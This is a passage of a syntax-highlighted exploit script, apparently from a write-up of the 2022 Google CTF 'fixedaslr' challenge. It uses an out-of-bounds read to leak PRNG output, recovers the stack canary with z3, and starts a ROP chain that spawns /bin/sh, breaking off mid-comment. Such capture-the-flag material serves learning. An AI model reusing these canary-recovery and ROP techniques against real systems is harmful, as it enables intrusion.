</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">144
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">145
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">146
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">147
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">148
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">149
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">150
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">151
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">152
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">153
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">154
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">155
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">156
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">157
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">158
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">159
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">160
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">161
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">162
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">163
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">164
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">165
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">166
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">167
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">168
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">169
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">170
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">171
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">172
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">173
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">174
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">175
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">176
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">177
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">178
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">179
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">180
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">181
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">182
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> p64, u64, p32, u32
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">z3</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Helper method to execute the OOB bug</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">oob</span>(r, offset):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Your choice?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;see (0-9)?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, <span style="color:#366">str</span>(offset)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;score: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#366">int</span>(r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Helper method to put our score into the scoreboard</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># and put our BOF payload</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">play</span>(r, n, payload):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Your choice?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(n):
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;How much is &#39;</span>)
</span></span><span style="display:flex;"><span>        out <span style="color:#555">=</span> r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39; ?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()[:<span style="color:#555">-</span><span style="color:#f60">2</span>]
</span></span><span style="display:flex;"><span>        ans <span style="color:#555">=</span> <span style="color:#366">eval</span>(out)
</span></span><span style="display:flex;"><span>        log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Question-</span><span style="color:#a00">{</span>i<span style="color:#555">+</span><span style="color:#f60">1</span><span style="color:#a00">}</span><span style="color:#c30">: </span><span style="color:#a00">{</span>out<span style="color:#555">.</span>decode()<span style="color:#a00">}</span><span style="color:#c30"> = </span><span style="color:#a00">{</span>ans<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendline(<span style="color:#366">str</span>(ans)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;How much is &#39;</span>)
</span></span><span style="display:flex;"><span>    out <span style="color:#555">=</span> r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39; ?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()[:<span style="color:#555">-</span><span style="color:#f60">2</span>]
</span></span><span style="display:flex;"><span>    ans <span style="color:#555">=</span> <span style="color:#366">eval</span>(out)<span style="color:#555">+</span><span style="color:#f60">5</span> <span style="color:#09f;font-style:italic"># Make it false</span>
</span></span><span style="display:flex;"><span>    log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Question-</span><span style="color:#a00">{</span>i<span style="color:#555">+</span><span style="color:#f60">2</span><span style="color:#a00">}</span><span style="color:#c30">: </span><span style="color:#a00">{</span>out<span style="color:#555">.</span>decode()<span style="color:#a00">}</span><span style="color:#c30"> = </span><span style="color:#a00">{</span>ans<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendline(<span style="color:#366">str</span>(ans)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;(0-31)?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, <span style="color:#366">str</span>(<span style="color:#366">len</span>(payload))<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;your name:&#39;</span>, payload)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> process([<span style="color:#c30">&#39;./loader&#39;</span>], env<span style="color:#555">=</span>{})
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>PLT_DEBUG:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#555">.</span>attach(r, gdbscript<span style="color:#555">=</span><span style="color:#c30">&#39;&#39;&#39;&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> remote(<span style="color:#c30">b</span><span style="color:#c30">&#39;fixedaslr.2022.ctfcompetition.com&#39;</span>, <span style="color:#f60">1337</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Recover the rand_state during the first rand() call of aslr_get_addr,
</span></span></span><span style="display:flex;"><span><span style="color:#c30">which equivalent to the canary value set by init_stack_guard method.
</span></span></span><span style="display:flex;"><span><span style="color:#c30">
</span></span></span><span style="display:flex;"><span><span style="color:#c30">We use the OOB bug on scoreboard. Notes that we can only recover
</span></span></span><span style="display:flex;"><span><span style="color:#c30">6 of rand() result of the aslr_get_addr method. Each rand() return
</span></span></span><span style="display:flex;"><span><span style="color:#c30">12-bit number, which is used as the first 12-bits of each address
</span></span></span><span style="display:flex;"><span><span style="color:#c30">those used by each object file in this challenge.
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>known_states <span style="color:#555">=</span> [<span style="color:#f60">0</span>, <span style="color:#f60">0</span>, <span style="color:#f60">0</span>, <span style="color:#f60">0</span>, <span style="color:#f60">0</span>, <span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Inspecting via gdb, offset 512 will give us the 1st rand()</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># result of the aslr_get_addr (taking the first 12-bits only)</span>
</span></span><span style="display:flex;"><span>base_1 <span style="color:#555">=</span> oob(r, <span style="color:#f60">512</span>)
</span></span><span style="display:flex;"><span>known_states[<span style="color:#f60">0</span>] <span style="color:#555">=</span> base_1 <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">28</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Inspecting via gdb, offset -1017 will give us the 3rd rand()</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># result of the aslr_get_addr (taking the first 12-bits only)</span>
</span></span><span style="display:flex;"><span>known_states[<span style="color:#f60">2</span>] <span style="color:#555">=</span> oob(r, <span style="color:#f60">2</span><span style="color:#555">**</span><span style="color:#f60">64</span><span style="color:#555">-</span><span style="color:#f60">1017</span>) <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">28</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Inspecting via gdb, offset -1019 will give us the 5th rand()</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># result of the aslr_get_addr (taking the first 12-bits only)</span>
</span></span><span style="display:flex;"><span>base_5 <span style="color:#555">=</span> oob(r, <span style="color:#f60">2</span><span style="color:#555">**</span><span style="color:#f60">64</span><span style="color:#555">-</span><span style="color:#f60">1019</span>)
</span></span><span style="display:flex;"><span>known_states[<span style="color:#f60">4</span>] <span style="color:#555">=</span> base_5 <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">28</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Inspecting via gdb, one of the address in region started with the 5th result</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># of the rand() contains an address which the first 12-bits is</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the result of the 4th rand()</span>
</span></span><span style="display:flex;"><span>offset_4 <span style="color:#555">=</span> <span style="color:#366">int</span>(((base_5<span style="color:#555">-</span><span style="color:#f60">0x1000</span><span style="color:#555">+</span><span style="color:#f60">8</span>)<span style="color:#555">-</span>(base_1<span style="color:#555">-</span><span style="color:#f60">0x60</span>)) <span style="color:#555">//</span> <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> offset_4 <span style="color:#555">&lt;</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>    offset_4 <span style="color:#555">=</span> <span style="color:#f60">2</span><span style="color:#555">**</span><span style="color:#f60">64</span> <span style="color:#555">+</span> offset_4
</span></span><span style="display:flex;"><span>base_4 <span style="color:#555">=</span> oob(r, offset_4)
</span></span><span style="display:flex;"><span>known_states[<span style="color:#f60">3</span>] <span style="color:#555">=</span> base_4 <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">28</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Inspecting via gdb, one of the address in region started with the 5th result</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># of the rand() also contains an address which the first 12-bits is</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the result of the 6th rand()</span>
</span></span><span style="display:flex;"><span>offset_6 <span style="color:#555">=</span> <span style="color:#366">int</span>(((base_5<span style="color:#555">+</span><span style="color:#f60">0x1000</span>)<span style="color:#555">-</span>(base_1<span style="color:#555">-</span><span style="color:#f60">0x60</span>)) <span style="color:#555">//</span> <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> offset_6 <span style="color:#555">&lt;</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>    offset_6 <span style="color:#555">=</span> <span style="color:#f60">2</span><span style="color:#555">**</span><span style="color:#f60">64</span> <span style="color:#555">+</span> offset_6
</span></span><span style="display:flex;"><span>base_6 <span style="color:#555">=</span> oob(r, offset_6)
</span></span><span style="display:flex;"><span>known_states[<span style="color:#f60">5</span>] <span style="color:#555">=</span> base_6 <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">28</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Inspecting via gdb, one of the address in region started with the 4th result</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># of the rand() also contains an address which the first 12-bits is</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the result of the 2nd rand()</span>
</span></span><span style="display:flex;"><span>offset_2 <span style="color:#555">=</span> <span style="color:#366">int</span>(((((base_4 <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">16</span>) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">16</span>) <span style="color:#555">+</span> <span style="color:#f60">0x38</span>)<span style="color:#555">-</span>(base_1<span style="color:#555">-</span><span style="color:#f60">0x60</span>)) <span style="color:#555">//</span> <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>base_2 <span style="color:#555">=</span> oob(r, offset_2)
</span></span><span style="display:flex;"><span>known_states[<span style="color:#f60">1</span>] <span style="color:#555">=</span> base_2  <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">28</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now we have 6 consecutives rand() result, we will try to recover</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the rand_state before the first rand(), which equivalents to</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the binary canary value.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># We use z3 to solve it.</span>
</span></span><span style="display:flex;"><span>s <span style="color:#555">=</span> Solver()
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Known states: </span><span style="color:#a00">{</span>known_states<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rand_state <span style="color:#555">=</span> BitVec(<span style="color:#c30">&#34;x&#34;</span>, <span style="color:#f60">64</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">rand_extract_bit</span>(a):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">global</span> rand_state
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> (rand_state <span style="color:#555">&gt;&gt;</span> a) <span style="color:#555">&amp;</span> <span style="color:#f60">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">rand_get_bit</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">global</span> rand_state
</span></span><span style="display:flex;"><span>    x <span style="color:#555">=</span> (
</span></span><span style="display:flex;"><span>        rand_extract_bit(<span style="color:#f60">0x3F</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> rand_extract_bit(<span style="color:#f60">0x3D</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> rand_extract_bit(<span style="color:#f60">0x3C</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> rand_extract_bit(<span style="color:#f60">0x3A</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> <span style="color:#f60">1</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>    rand_state <span style="color:#555">=</span> ((rand_state <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">1</span>) <span style="color:#555">%</span> (<span style="color:#f60">2</span><span style="color:#555">**</span><span style="color:#f60">64</span>)) <span style="color:#555">|</span> x
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">rand</span>(n):
</span></span><span style="display:flex;"><span>    x <span style="color:#555">=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(n):
</span></span><span style="display:flex;"><span>        y <span style="color:#555">=</span> rand_get_bit()
</span></span><span style="display:flex;"><span>        x <span style="color:#555">=</span> (x <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">1</span>) <span style="color:#555">|</span> y
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> known_state <span style="color:#000;font-weight:bold">in</span> known_states:
</span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>add(rand(<span style="color:#f60">0xc</span>) <span style="color:#555">==</span> known_state)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>recovered_canary <span style="color:#555">=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> s<span style="color:#555">.</span>check() <span style="color:#555">==</span> sat:
</span></span><span style="display:flex;"><span>    model <span style="color:#555">=</span> s<span style="color:#555">.</span>model()
</span></span><span style="display:flex;"><span>    recovered_canary <span style="color:#555">=</span> model[BitVec(<span style="color:#c30">&#34;x&#34;</span>, <span style="color:#f60">64</span>)]<span style="color:#555">.</span>as_long()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Recovered canary: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(recovered_canary)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now we have recovered the canary (rand_state), let&#39;s calculate</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the address of the 7th rand() result. Inspecting via gdb, this</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># 7th address contains a lot of useful gadgets.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Recover 7th address</span>
</span></span><span style="display:flex;"><span>rand_state <span style="color:#555">=</span> recovered_canary
</span></span><span style="display:flex;"><span>base_addr7 <span style="color:#555">=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">7</span>):
</span></span><span style="display:flex;"><span>    base_addr7 <span style="color:#555">=</span> rand(<span style="color:#f60">12</span>)
</span></span><span style="display:flex;"><span>base_addr7 <span style="color:#555">=</span> (base_addr7 <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">28</span>)<span style="color:#555">+</span><span style="color:#f60">0x1000</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Base Addr 7th: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(base_addr7)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Gadgets from the 7th address region (Gadget can be inspected via gdb)</span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#555">=</span> base_addr7<span style="color:#555">+</span><span style="color:#f60">0x1</span> <span style="color:#09f;font-style:italic"># pop rdi; ret;</span>
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#555">=</span> base_addr7<span style="color:#555">+</span><span style="color:#f60">0x4</span> <span style="color:#09f;font-style:italic"># pop rsi; ret;</span>
</span></span><span style="display:flex;"><span>pop_rax <span style="color:#555">=</span> base_addr7<span style="color:#555">+</span><span style="color:#f60">0x7</span> <span style="color:#09f;font-style:italic"># pop rax; ret;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Gadgets from the 2nd address region (Gadget can be inspected via gdb)</span>
</span></span><span style="display:flex;"><span>base_addr2 <span style="color:#555">=</span> ((base_2<span style="color:#555">&gt;&gt;</span><span style="color:#f60">8</span>)<span style="color:#555">&lt;&lt;</span><span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>syscall <span style="color:#555">=</span> base_addr2<span style="color:#555">+</span><span style="color:#f60">0x2</span> <span style="color:#09f;font-style:italic"># syscall;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now we know the canary, we just need to build ROP Chain to exploit</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the BOF bug that we found during setting our name in the scoreboard.</span>
</span></span><span style="display:flex;"><span>bin_sh_addr <span style="color:#555">=</span> base_1 <span style="color:#555">+</span> <span style="color:#f60">0x100</span> <span style="color:#09f;font-style:italic"># We will put /bin/sh\x00 string into the scoreboard name (which is in base_1+0x100)</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;/bin/sh addr: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(bin_sh_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># BOF payload</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Overwrite saved rbp</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - pop bin_sh_addr to rdi. Now rdi contain pointer to b&#39;/bin/sh\x00&#39; string</span>
